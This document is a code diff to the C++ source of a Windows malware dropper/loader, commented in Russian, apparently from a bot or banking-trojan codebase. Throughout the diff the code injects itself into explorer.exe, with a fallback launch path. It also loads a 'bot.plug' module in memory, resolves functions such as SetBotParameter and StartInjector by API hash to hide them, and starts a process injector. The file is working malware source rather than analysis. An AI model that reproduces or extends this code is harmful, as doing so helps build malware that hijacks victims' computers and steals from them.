@@ -5,12 +5,29 @@
 #include "Inject.h"
 #include "Installer.h"
 
+//---------------------------------------------------------------------------
+
+#include "BotDebug.h"
+
+namespace DROPPERDEBUGSTRINGS
+{
+	#include "DbgTemplates.h"
+}
+
+// Объявляем шаблон вывода отладочных строк
+#define DRPDBG DROPPERDEBUGSTRINGS::DBGOutMessage<>
+
+//---------------------------------------------------------------------------
+
+
+
 #pragma comment(linker, "/ENTRY:LoaderMain" )
 
 
 
 char  DropperName[MAX_PATH];  // Имя ехе стартующего файла
-DWORD DropperPID = 0; // PID дропера бота
+DWORD DropperPID = 0;         // PID дропера бота
+BOOL  InExplorer = FALSE;     // Пизнак того что удалось заинжектиться в эксплорер
 
 
 typedef BOOL (WINAPI *TSetBotParameter)(DWORD ParamID, PCHAR Param);
@@ -34,6 +51,7 @@ bool DoSetParam(PCHAR Buf, DWORD BufSize, DWORD Id)
 bool SetBotPlugParams(LPVOID Handle)
 {
 	// Получаем функцию установки параметра
+	DRPDBG("_BOT_LOADER", "Устанавливаем параметры bot.plug");
 	SetParam = (TSetBotParameter)MemoryGetProcAddress(Handle, 0xA336A349 /* SetBotParameter */);
 	if (!SetParam) return false;
 
@@ -51,9 +69,9 @@ bool SetBotPlugParams(LPVOID Handle)
 //---------------------------------------------
 //  Функция запускает плагин
 //---------------------------------------------
-void StartBotPlug(LPVOID Buf)
+void StartBotPlug(LPVOID Handle)
 {
-	 LPVOID Handle = MemoryLoadLibrary(Buf,  false);
+	DRPDBG("_BOT_LOADER", "Стартуем bot.plug");
 	if (Handle)
 	{
 		typedef void (WINAPI *TStart)(BOOL Initialize, BOOL Start, BOOL IsLoaderPlugin);
@@ -66,6 +84,8 @@ void StartBotPlug(LPVOID Buf)
 			SetBotPlugParams(Handle);
 			// Стартуем плаин
 			Start(FALSE, TRUE, TRUE);
+
+			DRPDBG("_BOT_LOADER", "Плагин запущен");
 		}
 	} 
 }
@@ -76,10 +96,12 @@ void StartBotPlug(LPVOID Buf)
 //---------------------------------------------------------------------
 //  Функция загрузки плагина
 //---------------------------------------------------------------------
-DWORD WINAPI ExplorerMainProc(LPVOID)
+DWORD WINAPI DropperMainProc(LPVOID)
 {
-	// Загружаем dll 
+
 	BOT::Initialize();
+	DRPDBG("_BOT_LOADER", "Запущена основная функция лоадера. В эксплорере %d, в процессе: \r\n%s", InExplorer, Bot->ApplicationName().t_str());
+
 	// Запускаем систему информирования о повторном запуске
 	BOT::TryCreateBotInstance();
 	// Инсталируем ладер
@@ -89,30 +111,65 @@ DWORD WINAPI ExplorerMainProc(LPVOID)
 	LPVOID Plugin;
 	if (LoadBotPlug(&Plugin, NULL))
 	{
-		StartBotPlug(Plugin);
+		DRPDBG("_BOT_LOADER", "bot.plug успешо загружен");
+		LPVOID Handle = MemoryLoadLibrary(Plugin,  false);
+		StartBotPlug(Handle);
+		if (!InExplorer)
+		{
+			// Если не удалось заинжектиться в эксплорер стартуем инжектор
+			DRPDBG("_BOT_LOADER", "Стартуем инжектор");
+			typedef BOOL (WINAPI *TStartInjector)();
+			TStartInjector StartInjector  = (TStartInjector)MemoryGetProcAddress(Handle, 0x2DD014DD /* StartInjector */);
+			if (StartInjector) 
+				StartInjector();
+		}
 		FreeBotPlug(Plugin);
 	}
+	pSleep(INFINITE);
 	return 0; 
 }
 
-
-
-
+/*
+BOOL CALLBACK WndEnumCallBak(HWND Wnd, LPARAM Param)
+{
+	char ClassName[1024];
+	pGetClassNameA(Wnd, ClassName, 1024);
+	if (STRA::Pos(ClassName, "IEFrame") >= 0)
+	{
+		DWORD PID = 0;
+		pGetWindowThreadProcessId(Wnd, &PID);
+		string F;
+		F.Format("%d %s", PID, ClassName);
+		pOutputDebugStringA(F.t_str());
+	}
+	return TRUE;
+}
+*/
 //---------------------------------------------------------------------
 //  Основная функция txe  
 //---------------------------------------------------------------------
 int APIENTRY LoaderMain() 
 {
 	// Получаем имя дропера
+
+//	EnumWindows(WndEnumCallBak, NULL);
+//	ExitProcess(0);
+
 	BOT::Initialize();
+
 	if (!BOT::IsRunning())
 	{
+		DRPDBG("_BOT_LOADER", "Запускается загрузчик бота");
 		DropperPID = GetCurrentProcessId();
 		GetModuleFileNameA(NULL, DropperName, MAX_PATH);
-		InjectIntoExplorer(ExplorerMainProc);
-	}
+		if (!IsWIN64())
+			InExplorer = InjectIntoExplorer(DropperMainProc);
+		if (!InExplorer)
+			MegaJump(DropperMainProc);
+	} 
 
-	ExitProcess(0); 
+	
+	pExitProcess(0); 
 	return 0;
 }
 
